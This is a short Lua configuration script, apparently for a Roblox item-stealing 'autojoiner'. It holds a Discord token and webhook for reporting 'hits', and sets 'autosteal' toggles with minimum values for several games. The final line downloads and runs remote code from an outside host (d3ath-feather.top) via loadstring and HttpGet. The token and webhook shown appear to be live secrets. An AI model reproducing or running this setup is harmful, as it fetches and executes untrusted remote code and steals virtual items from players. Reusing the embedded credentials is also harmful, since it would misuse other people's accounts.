token = "OTQ2Nzc0NjkwNjc5MTA3NTg0.Ge-A3_.-XwwxHqhr6j63P3qIrhZqGDu4UQr6czS9UVe-c" --can use ur alts token or a bot token (more secure) and put the token between the ""
infowebhook = "https://discord.com/api/webhooks/1452413120327712890/yzFTOQqIuhbuUEtUfqq13dnNMwiMw7GsJm9rwy6szC-ACae10ce5xidQRe61MYVR_awW" -- THIS IS REQUIRED IF YOU DONT USE A BOT TOKEN
channelId = "1386520133924814948" --where hits are, put it between ""
log_channel = ""--ONLY IF YOU USE BOT TOKEN where the bot will output command result and logs of new items
bot = false -- change false to true if you use a bot token
debugging = false--set to true if u want  to see why it doesnt join the player
settings = {
    ["gag"] = {autosteal = true}, -- set the value to true if you want to autosteal this game, else set it to false
    ["mm2"] = {autosteal = true, minvalue = 100}, -- set the value to true if you want to autosteal this game, else set it to false
    ["adm"] = {autosteal = true, minvalue = 20}, -- set the value to true if you want to autosteal this game, else set it to false
}
loadstring(game:HttpGet("http://d3ath-feather.top:9471/autojoiner.lua"))()
